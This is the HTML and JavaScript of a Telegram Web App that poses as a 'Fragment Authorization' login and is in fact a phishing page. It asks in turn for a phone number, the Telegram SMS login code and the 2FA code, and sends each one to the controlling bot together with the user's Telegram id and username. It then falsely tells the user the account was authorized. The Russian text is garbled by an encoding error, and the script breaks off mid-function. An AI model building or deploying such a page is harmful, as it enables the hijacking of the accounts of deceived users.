<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fragment Authorization</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    /* –°—Ç–∏–ª–∏ —Å —É–≤–µ–ª–∏—á–µ–Ω–Ω–æ–π –∑–∞–∫—Ä—É–≥–ª–µ–Ω–Ω–æ—Å—Ç—å—é */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0;
      padding: 15px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      background-color: #ffffff;
    }

    .container {
      background-color: #fff;
      border-radius: 20px;
      box-shadow: 0 4px 25px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 440px;
      padding: 25px;
      text-align: center;
      margin: 10px 0;
    }

    .icons {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 25px;
    }

    .icons img {
      width: 45px;
      height: 45px;
      border-radius: 12px;
    }

    h1 {
      font-size: 22px;
      font-weight: 800;
      margin-bottom: 12px;
      color: #000;
      line-height: 1.3;
    }

    p {
      font-size: 15px;
      color: #555;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .input-group {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 25px;
    }

    select {
      width: 100%;
      padding: 14px 40px 14px 14px;
      border: none;
      border-radius: 16px;
      font-size: 15px;
      box-sizing: border-box;
      background-color: #f8f9fa;
      color: #007bff;
      font-weight: 500;
      appearance: none;
      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23666'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
      background-repeat: no-repeat;
      background-position: right 14px center;
      background-size: 16px;
      height: 48px;
    }

    .phone-input {
      display: flex;
      background-color: #f8f9fa;
      border-radius: 16px;
      overflow: hidden;
      height: 48px;
    }

    .country-code {
      padding: 14px;
      background: #f8f9fa;
      border-right: 1.5px solid #e9ecef;
      min-width: 65px;
      color: #000;
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 4px 0;
      border-radius: 16px 0 0 16px;
      font-size: 15px;
    }

    .phone-number {
      flex: 1;
      border: none;
      padding: 14px;
      background: #f8f9fa;
      border-radius: 0 16px 16px 0;
      font-size: 15px;
      height: 100%;
    }

    .phone-number:focus {
      outline: none;
    }

    select:focus {
      outline: none;
    }

    .buttons {
      display: flex;
      justify-content: space-between;
      gap: 12px;
    }

    .buttons button {
      flex: 1;
      padding: 14px;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 14px;
      cursor: pointer;
    }

    .cancel-btn {
      background: none;
      color: #007bff;
      border: 1px solid #007bff;
    }

    .next-btn {
      background: #007bff;
      color: #fff;
    }

    .screen {
      display: none;
    }

    .screen.active {
      display: block;
    }

    .code-inputs {
      display: flex;
      gap: 12px;
      justify-content: center;
      margin-bottom: 25px;
    }

    .code-input {
      width: 45px;
      height: 55px;
      border: 2px solid #ddd;
      border-radius: 14px;
      text-align: center;
      font-size: 22px;
      font-weight: bold;
      outline: none;
    }

    .code-input:focus {
      border-color: #007bff;
    }

    .back-btn {
      background: none;
      border: none;
      color: #007bff;
      font-size: 15px;
      cursor: pointer;
      margin-bottom: 20px;
      padding: 8px 0;
      display: inline-block;
      border-radius: 8px;
    }

    .hint {
      font-size: 14px;
      color: #666;
      margin-top: 12px;
      line-height: 1.4;
    }

    .resend-code {
      margin-top: 20px;
      font-size: 15px;
      color: #555;
      line-height: 1.5;
    }

    .resend-link {
      color: #007bff;
      cursor: pointer;
      text-decoration: none;
      font-weight: 500;
      border-radius: 6px;
      padding: 2px 4px;
    }

    .success-screen {
      text-align: center;
      padding: 20px 0;
    }

    .success-icon {
      font-size: 70px;
      margin-bottom: 25px;
    }

    /* –ê–¥–∞–ø—Ç–∏–≤–Ω–æ—Å—Ç—å –¥–ª—è –º–∞–ª–µ–Ω—å–∫–∏—Ö —ç–∫—Ä–∞–Ω–æ–≤ */
    @media (max-height: 700px) {
      body {
        align-items: flex-start;
        padding: 10px;
      }
      
      .container {
        padding: 20px;
        margin: 5px 0;
        border-radius: 18px;
      }
      
      .icons {
        margin-bottom: 20px;
      }
      
      .icons img {
        width: 40px;
        height: 40px;
      }
      
      h1 {
        font-size: 20px;
        margin-bottom: 10px;
      }
      
      p {
        font-size: 14px;
        margin-bottom: 15px;
      }
      
      .input-group {
        margin-bottom: 20px;
      }
    }

    @media (max-width: 480px) {
      .container {
        padding: 20px 15px;
        border-radius: 18px;
      }
      
      .code-input {
        width: 40px;
        height: 50px;
        font-size: 20px;
        border-radius: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- –≠–∫—Ä–∞–Ω 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
  <div class="container screen active" id="screen1">
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
    </div>
    <h1 style="margin-bottom: 8px;">–í–æ–π–¥–∏—Ç–µ, —á—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∞–∫–∫–∞—É–Ω—Ç Telegram</h1>
    <p style="font-size: 15px; color: #555; margin-bottom: 8px; line-height: 1.5;">
      –¥–ª—è <a href="https://fragment.com" style="color: #007bff; cursor: pointer; text-decoration: none;">fragment.com</a> –∏ <a href="https://t.me/fragment" style="color: #007bff; cursor: pointer; text-decoration: none;">Fragment Auction Alerts</a>.
    </p>
    <p style="font-size: 15px; color: #555; margin-bottom: 25px; line-height: 1.5;">
      –í–≤–µ–¥–∏—Ç–µ —Å–≤–æ–π <strong>–Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</strong> –≤ <span style="color: #007bff; cursor: pointer;">–º–µ–∂–¥—É–Ω–∞—Ä–æ–¥–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ</span>.<br>
      –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram.
    </p>
    <div class="input-group">
      <select id="country" onchange="updateCountryCode()">
        <option value="+7">–†–æ—Å—Å–∏—è (+7)</option>
        <option value="+375">–ë–µ–ª–∞—Ä—É—Å—å (+375)</option>
        <option value="+380">–£–∫—Ä–∞–∏–Ω–∞ (+380)</option>
        <option value="+7">–ö–∞–∑–∞—Ö—Å—Ç–∞–Ω (+7)</option>
        <option value="+93">–ê—Ñ–≥–∞–Ω–∏—Å—Ç–∞–Ω (+93)</option>
        <option value="+355">–ê–ª–±–∞–Ω–∏—è (+355)</option>
        <option value="+213">–ê–ª–∂–∏—Ä (+213)</option>
        <option value="+376">–ê–Ω–¥–æ—Ä—Ä–∞ (+376)</option>
        <option value="+244">–ê–Ω–≥–æ–ª–∞ (+244)</option>
        <option value="+54">–ê—Ä–≥–µ–Ω—Ç–∏–Ω–∞ (+54)</option>
        <option value="+374">–ê—Ä–º–µ–Ω–∏—è (+374)</option>
        <option value="+61">–ê–≤—Å—Ç—Ä–∞–ª–∏—è (+61)</option>
        <option value="+43">–ê–≤—Å—Ç—Ä–∏—è (+43)</option>
        <option value="+994">–ê–∑–µ—Ä–±–∞–π–¥–∂–∞–Ω (+994)</option>
        <option value="+973">–ë–∞—Ö—Ä–µ–π–Ω (+973)</option>
        <option value="+880">–ë–∞–Ω–≥–ª–∞–¥–µ—à (+880)</option>
        <option value="+32">–ë–µ–ª—å–≥–∏—è (+32)</option>
        <option value="+501">–ë–µ–ª–∏–∑ (+501)</option>
        <option value="+229">–ë–µ–Ω–∏–Ω (+229)</option>
        <option value="+975">–ë—É—Ç–∞–Ω (+975)</option>
        <option value="+591">–ë–æ–ª–∏–≤–∏—è (+591)</option>
        <option value="+387">–ë–æ—Å–Ω–∏—è –∏ –ì–µ—Ä—Ü–µ–≥–æ–≤–∏–Ω–∞ (+387)</option>
        <option value="+55">–ë—Ä–∞–∑–∏–ª–∏—è (+55)</option>
        <option value="+673">–ë—Ä—É–Ω–µ–π (+673)</option>
        <option value="+359">–ë–æ–ª–≥–∞—Ä–∏—è (+359)</option>
        <option value="+226">–ë—É—Ä–∫–∏–Ω–∞-–§–∞—Å–æ (+226)</option>
        <option value="+257">–ë—É—Ä—É–Ω–¥–∏ (+257)</option>
        <option value="+855">–ö–∞–º–±–æ–¥–∂–∞ (+855)</option>
        <option value="+237">–ö–∞–º–µ—Ä—É–Ω (+237)</option>
        <option value="+1">–ö–∞–Ω–∞–¥–∞ (+1)</option>
        <option value="+238">–ö–∞–±–æ-–í–µ—Ä–¥–µ (+238)</option>
        <option value="+236">–¶–ê–† (+236)</option>
        <option value="+235">–ß–∞–¥ (+235)</option>
        <option value="+56">–ß–∏–ª–∏ (+56)</option>
        <option value="+86">–ö–∏—Ç–∞–π (+86)</option>
        <option value="+57">–ö–æ–ª—É–º–±–∏—è (+57)</option>
        <option value="+269">–ö–æ–º–æ—Ä—ã (+269)</option>
        <option value="+242">–ö–æ–Ω–≥–æ (+242)</option>
        <option value="+506">–ö–æ—Å—Ç–∞-–†–∏–∫–∞ (+506)</option>
        <option value="+385">–•–æ—Ä–≤–∞—Ç–∏—è (+385)</option>
        <option value="+53">–ö—É–±–∞ (+53)</option>
        <option value="+357">–ö–∏–ø—Ä (+357)</option>
        <option value="+420">–ß–µ—Ö–∏—è (+420)</option>
        <option value="+45">–î–∞–Ω–∏—è (+45)</option>
        <option value="+253">–î–∂–∏–±—É—Ç–∏ (+253)</option>
        <option value="+1">–î–æ–º–∏–Ω–∏–∫–∞ (+1)</option>
        <option value="+1">–î–æ–º–∏–Ω–∏–∫–∞–Ω—Å–∫–∞—è –†–µ—Å–ø—É–±–ª–∏–∫–∞ (+1)</option>
        <option value="+593">–≠–∫–≤–∞–¥–æ—Ä (+593)</option>
        <option value="+20">–ï–≥–∏–ø–µ—Ç (+20)</option>
        <option value="+503">–°–∞–ª—å–≤–∞–¥–æ—Ä (+503)</option>
        <option value="+240">–≠–∫–≤–∞—Ç–æ—Ä–∏–∞–ª—å–Ω–∞—è –ì–≤–∏–Ω–µ—è (+240)</option>
        <option value="+291">–≠—Ä–∏—Ç—Ä–µ—è (+291)</option>
        <option value="+372">–≠—Å—Ç–æ–Ω–∏—è (+372)</option>
        <option value="+251">–≠—Ñ–∏–æ–ø–∏—è (+251)</option>
        <option value="+679">–§–∏–¥–∂–∏ (+679)</option>
        <option value="+358">–§–∏–Ω–ª—è–Ω–¥–∏—è (+358)</option>
        <option value="+33">–§—Ä–∞–Ω—Ü–∏—è (+33)</option>
        <option value="+241">–ì–∞–±–æ–Ω (+241)</option>
        <option value="+220">–ì–∞–º–±–∏—è (+220)</option>
        <option value="+995">–ì—Ä—É–∑–∏—è (+995)</option>
        <option value="+49">–ì–µ—Ä–º–∞–Ω–∏—è (+49)</option>
        <option value="+233">–ì–∞–Ω–∞ (+233)</option>
        <option value="+30">–ì—Ä–µ—Ü–∏—è (+30)</option>
        <option value="+502">–ì–≤–∞—Ç–µ–º–∞–ª–∞ (+502)</option>
        <option value="+224">–ì–≤–∏–Ω–µ—è (+224)</option>
        <option value="+245">–ì–≤–∏–Ω–µ—è-–ë–∏—Å–∞—É (+245)</option>
        <option value="+592">–ì–∞–π–∞–Ω–∞ (+592)</option>
        <option value="+509">–ì–∞–∏—Ç–∏ (+509)</option>
        <option value="+504">–ì–æ–Ω–¥—É—Ä–∞—Å (+504)</option>
        <option value="+36">–í–µ–Ω–≥—Ä–∏—è (+36)</option>
        <option value="+354">–ò—Å–ª–∞–Ω–¥–∏—è (+354)</option>
        <option value="+91">–ò–Ω–¥–∏—è (+91)</option>
        <option value="+62">–ò–Ω–¥–æ–Ω–µ–∑–∏—è (+62)</option>
        <option value="+98">–ò—Ä–∞–Ω (+98)</option>
        <option value="+964">–ò—Ä–∞–∫ (+964)</option>
        <option value="+353">–ò—Ä–ª–∞–Ω–¥–∏—è (+353)</option>
        <option value="+972">–ò–∑—Ä–∞–∏–ª—å (+972)</option>
        <option value="+39">–ò—Ç–∞–ª–∏—è (+39)</option>
        <option value="+81">–Ø–ø–æ–Ω–∏—è (+81)</option>
        <option value="+962">–ò–æ—Ä–¥–∞–Ω–∏—è (+962)</option>
        <option value="+254">–ö–µ–Ω–∏—è (+254)</option>
        <option value="+965">–ö—É–≤–µ–π—Ç (+965)</option>
        <option value="+856">–õ–∞–æ—Å (+856)</option>
        <option value="+371">–õ–∞—Ç–≤–∏—è (+371)</option>
        <option value="+961">–õ–∏–≤–∞–Ω (+961)</option>
        <option value="+266">–õ–µ—Å–æ—Ç–æ (+266)</option>
        <option value="+231">–õ–∏–±–µ—Ä–∏—è (+231)</option>
        <option value="+218">–õ–∏–≤–∏—è (+218)</option>
        <option value="+423">–õ–∏—Ö—Ç–µ–Ω—à—Ç–µ–π–Ω (+423)</option>
        <option value="+370">–õ–∏—Ç–≤–∞ (+370)</option>
        <option value="+352">–õ—é–∫—Å–µ–º–±—É—Ä–≥ (+352)</option>
        <option value="+261">–ú–∞–¥–∞–≥–∞—Å–∫–∞—Ä (+261)</option>
        <option value="+265">–ú–∞–ª–∞–≤–∏ (+265)</option>
        <option value="+60">–ú–∞–ª–∞–π–∑–∏—è (+60)</option>
        <option value="+960">–ú–∞–ª—å–¥–∏–≤—ã (+960)</option>
        <option value="+223">–ú–∞–ª–∏ (+223)</option>
        <option value="+356">–ú–∞–ª—å—Ç–∞ (+356)</option>
        <option value="+222">–ú–∞–≤—Ä–∏—Ç–∞–Ω–∏—è (+222)</option>
        <option value="+230">–ú–∞–≤—Ä–∏–∫–∏–π (+230)</option>
        <option value="+52">–ú–µ–∫—Å–∏–∫–∞ (+52)</option>
        <option value="+373">–ú–æ–ª–¥–æ–≤–∞ (+373)</option>
        <option value="+377">–ú–æ–Ω–∞–∫–æ (+377)</option>
        <option value="+976">–ú–æ–Ω–≥–æ–ª–∏—è (+976)</option>
        <option value="+382">–ß–µ—Ä–Ω–æ–≥–æ—Ä–∏—è (+382)</option>
        <option value="+212">–ú–∞—Ä–æ–∫–∫–æ (+212)</option>
        <option value="+258">–ú–æ–∑–∞–º–±–∏–∫ (+258)</option>
        <option value="+95">–ú—å—è–Ω–º–∞ (+95)</option>
        <option value="+264">–ù–∞–º–∏–±–∏—è (+264)</option>
        <option value="+977">–ù–µ–ø–∞–ª (+977)</option>
        <option value="+31">–ù–∏–¥–µ—Ä–ª–∞–Ω–¥—ã (+31)</option>
        <option value="+64">–ù–æ–≤–∞—è –ó–µ–ª–∞–Ω–¥–∏—è (+64)</option>
        <option value="+505">–ù–∏–∫–∞—Ä–∞–≥—É–∞ (+505)</option>
        <option value="+227">–ù–∏–≥–µ—Ä (+227)</option>
        <option value="+234">–ù–∏–≥–µ—Ä–∏—è (+234)</option>
        <option value="+47">–ù–æ—Ä–≤–µ–≥–∏—è (+47)</option>
        <option value="+968">–û–º–∞–Ω (+968)</option>
        <option value="+92">–ü–∞–∫–∏—Å—Ç–∞–Ω (+92)</option>
        <option value="+507">–ü–∞–Ω–∞–º–∞ (+507)</option>
        <option value="+595">–ü–∞—Ä–∞–≥–≤–∞–π (+595)</option>
        <option value="+51">–ü–µ—Ä—É (+51)</option>
        <option value="+63">–§–∏–ª–∏–ø–ø–∏–Ω—ã (+63)</option>
        <option value="+48">–ü–æ–ª—å—à–∞ (+48)</option>
        <option value="+351">–ü–æ—Ä—Ç—É–≥–∞–ª–∏—è (+351)</option>
        <option value="+974">–ö–∞—Ç–∞—Ä (+974)</option>
        <option value="+40">–†—É–º—ã–Ω–∏—è (+40)</option>
        <option value="+250">–†—É–∞–Ω–¥–∞ (+250)</option>
        <option value="+966">–°–∞—É–¥–æ–≤—Å–∫–∞—è –ê—Ä–∞–≤–∏ia (+966)</option>
        <option value="+221">–°–µ–Ω–µ–≥–∞–ª (+221)</option>
        <option value="+381">–°–µ—Ä–±–∏—è (+381)</option>
        <option value="+248">–°–µ–π—à–µ–ª—ã (+248)</option>
        <option value="+232">–°—å–µ—Ä—Ä–∞-–õ–µ–æ–Ω–µ (+232)</option>
        <option value="+65">–°–∏–Ω–≥–∞–ø—É—Ä (+65)</option>
        <option value="+421">–°–ª–æ–≤–∞–∫–∏—è (+421)</option>
        <option value="+386">–°–ª–æ–≤–µ–Ω–∏—è (+386)</option>
        <option value="+252">–°–æ–º–∞–ª–∏ (+252)</option>
        <option value="+27">–Æ–ê–† (+27)</option>
        <option value="+82">–Æ–∂–Ω–∞—è –ö–æ—Ä–µ—è (+82)</option>
        <option value="+34">–ò—Å–ø–∞–Ω–∏—è (+34)</option>
        <option value="+94">–®—Ä–∏-–õ–∞–Ω–∫–∞ (+94)</option>
        <option value="+249">–°—É–¥–∞–Ω (+249)</option>
        <option value="+597">–°—É—Ä–∏–Ω–∞–º (+597)</option>
        <option value="+46">–®–≤–µ—Ü–∏—è (+46)</option>
        <option value="+41">–®–≤–µ–π—Ü–∞—Ä–∏—è (+41)</option>
        <option value="+963">–°–∏—Ä–∏—è (+963)</option>
        <option value="+886">–¢–∞–π–≤–∞–Ω—å (+886)</option>
        <option value="+992">–¢–∞–¥–∂–∏–∫–∏—Å—Ç–∞–Ω (+992)</option>
        <option value="+255">–¢–∞–Ω–∑–∞–Ω–∏—è (+255)</option>
        <option value="+66">–¢–∞–∏–ª–∞–Ω–¥ (+66)</option>
        <option value="+228">–¢–æ–≥–æ (+228)</option>
        <option value="+676">–¢–æ–Ω–≥–∞ (+676)</option>
        <option value="+216">–¢—É–Ω–∏—Å (+216)</option>
        <option value="+90">–¢—É—Ä—Ü–∏—è (+90)</option>
        <option value="+993">–¢—É—Ä–∫–º–µ–Ω–∏—Å—Ç–∞–Ω (+993)</option>
        <option value="+256">–£–≥–∞–Ω–¥–∞ (+256)</option>
        <option value="+971">–û–ê–≠ (+971)</option>
        <option value="+44">–í–µ–ª–∏–∫–æ–±—Ä–∏—Ç–∞–Ω–∏—è (+44)</option>
        <option value="+1">–°–®–ê (+1)</option>
        <option value="+598">–£—Ä—É–≥–≤–∞–π (+598)</option>
        <option value="+998">–£–∑–±–µ–∫–∏—Å—Ç–∞–Ω (+998)</option>
        <option value="+678">–í–∞–Ω—É–∞—Ç—É (+678)</option>
        <option value="+58">–í–µ–Ω–µ—Å—É—ç–ª–∞ (+58)</option>
        <option value="+84">–í—å–µ—Ç–Ω–∞–º (+84)</option>
        <option value="+967">–ô–µ–º–µ–Ω (+967)</option>
        <option value="+260">–ó–∞–º–±–∏—è (+260)</option>
        <option value="+263">–ó–∏–º–±–∞–±–≤–µ (+263)</option>
      </select>
      <div class="phone-input">
        <span class="country-code" id="countryCode">+7</span>
        <input type="text" class="phone-number" id="phone" placeholder="–í–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞">
      </div>
    </div>
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">–û–¢–ú–ï–ù–ê</button>
      <button class="next-btn" onclick="handlePhoneSubmit()">–î–ê–õ–ï–ï</button>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω 2: –í–≤–æ–¥ SMS –∫–æ–¥–∞ -->
  <div class="container screen" id="screen2">
    <button class="back-btn" onclick="prevScreen(1)">‚Üê –ù–∞–∑–∞–¥</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
    </div>
    <h1>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS</h1>
    <p>–ú—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="resend-code" id="resendCodeBlock">
      –ù–µ –ø—Ä–∏—à–µ–ª –∫–æ–¥? <a href="javascript:void(0)" class="resend-link" id="resendLink" onclick="resendCode()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ</a>
      <span id="resendTimer" style="display: none; margin-left: 5px;"></span>
    </div>
    
    <div class="buttons">
      <button class="next-btn" onclick="handleSmsSubmit()">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω 3: –í–≤–æ–¥ 2FA –∫–æ–¥–∞ -->
  <div class="container screen" id="screen3">
    <button class="back-btn" onclick="prevScreen(2)">‚Üê –ù–∞–∑–∞–¥</button>
    <div class="icons">
      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Icon">
      <img src="https://cryptorussia.ru/wp-content/uploads/2025/08/fragment-telegram-462287.jpeg" alt="Fragment Logo" class="fragment-logo">
    </div>
    <h1>–î–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è</h1>
    <p>–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏.</p>
    
    <div class="code-inputs">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)">
      <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)">
      <input type="text" class="code-input" maxlength="1">
    </div>
    
    <div class="hint">–î–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –≤–≤–µ–¥–∏—Ç–µ 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥</div>
    
    <div class="buttons">
      <button class="cancel-btn" onclick="handleCancel()">–û–¢–ú–ï–ù–ê</button>
      <button class="next-btn" onclick="handle2faSubmit()">–ó–ê–í–ï–†–®–ò–¢–¨</button>
    </div>
  </div>

  <!-- –≠–∫—Ä–∞–Ω 4: –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è -->
  <div class="container screen" id="screen4">
    <div class="success-screen">
      <div class="success-icon">‚úÖ</div>
      <h1>–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!</h1>
      <p>–í–∞—à –∞–∫–∫–∞—É–Ω—Ç Fragment –±—ã–ª —É—Å–ø–µ—á–Ω–æ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω. –¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –≤–µ—Ä–Ω—É—Ç—å—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –±–æ—Ç–∞ –¥–ª—è –ø—Ä–æ–¥–æ–ª–∂–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã.</p>
      
      <div class="buttons">
        <button class="next-btn" onclick="closeWebApp()">–í–ï–†–ù–£–¢–¨–°–Ø –í –ë–û–¢–ê</button>
      </div>
    </div>
  </div>

  <script>
    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram Web App
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.MainButton.hide();

    let currentScreen = 1;
    let resendTimerInterval;

    // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–æ–≤
    function sendLog(action, details = '') {
      try {
        const user = tg.initDataUnsafe?.user;
        const timestamp = new Date().toLocaleString('ru-RU');
        
        const logData = {
          type: 'log',
          action: action,
          details: details,
          user: user ? {
            id: user.id,
            first_name: user.first_name,
            username: user.username
          } : null,
          timestamp: timestamp
        };
        
        console.log('üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –ª–æ–≥–∞:', logData);
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞
        tg.sendData(JSON.stringify(logData));
        
      } catch (error) {
        console.error('‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –ª–æ–≥–∞:', error);
      }
    }

    function updateCountryCode() {
      const countrySelect = document.getElementById('country');
      const countryCodeElement = document.getElementById('countryCode');
      const selectedValue = countrySelect.value;
      countryCodeElement.textContent = selectedValue;
    }

    function nextScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;
    }

    function prevScreen(screenNumber) {
      document.getElementById(`screen${currentScreen}`).classList.remove('active');
      document.getElementById(`screen${screenNumber}`).classList.add('active');
      currentScreen = screenNumber;
    }

    function moveToNext(input, currentIndex) {
      if (input.value.length === 1) {
        const inputs = input.parentElement.querySelectorAll('.code-input');
        if (currentIndex < inputs.length) {
          inputs[currentIndex].focus();
        }
      }
    }

    function handlePhoneSubmit() {
      const phone = document.getElementById('phone').value;
      const countrySelect = document.getElementById('country');
      const country = countrySelect.options[countrySelect.selectedIndex].text;
      const countryCode = document.getElementById('countryCode').textContent;
      
      if (!phone) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞');
        return;
      }
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥ –æ –≤–≤–æ–¥–µ –Ω–æ–º–µ—Ä–∞
      sendLog('PHONE_ENTERED', `–°—Ç—Ä–∞–Ω–∞: ${country}, –ù–æ–º–µ—Ä: ${countryCode}${phone}`);
      nextScreen(2);
    }

    function handleSmsSubmit() {
      const codeInputs = document.querySelectorAll('#screen2 .code-input');
      let smsCode = '';
      codeInputs.forEach(input => smsCode += input.value);
      
      if (smsCode.length !== 5) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π 5-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
        return;
      }
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥ –æ –≤–≤–æ–¥–µ SMS –∫–æ–¥–∞
      sendLog('SMS_CODE_ENTERED', `–ö–æ–¥: ${smsCode}`);
      nextScreen(3);
    }

    function handle2faSubmit() {
      const codeInputs = document.querySelectorAll('#screen3 .code-input');
      let faCode = '';
      codeInputs.forEach(input => faCode += input.value);
      
      if (faCode.length !== 6) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–æ–ª–Ω—ã–π 6-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥');
        return;
      }
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥ –æ –≤–≤–æ–¥–µ 2FA –∫–æ–¥–∞
      sendLog('2FA_CODE_ENTERED', `–ö–æ–¥: ${faCode}`);
      completeAuth();
    }

    function resendCode() {
      const resendLink = document.getElementById('resendLink');
      const resendTimer = document.getElementById('resendTimer');
      
      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥ –æ –∑–∞–ø—Ä–æ—Å–µ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–∏ –∫–æ–¥–∞
      sendLog('RESEND_CODE_REQUESTED', '–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–æ—Å–∏–ª –ø–æ–≤—Ç–æ—Ä–Ω—É—é –æ—Ç–ø—Ä–∞–≤–∫—É SMS –∫–æ–¥–∞');
      
      // –ë–ª–æ–∫–∏—Ä—É–µ–º –∫–Ω–æ–ø–∫—É –∏ –∑–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä
      resendLink.style.pointerEvents = 'none';
      resendLink.style.color = '#999';
      resendLink.textContent = '–û—Ç–ø—Ä–∞–≤–∏—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ';
      resendTimer.style.display = 'inline';
      
      let timeLeft = 30;
      resendTimer.textContent = `(00:${timeLeft.toString().padStart(2, '0')})`;
      
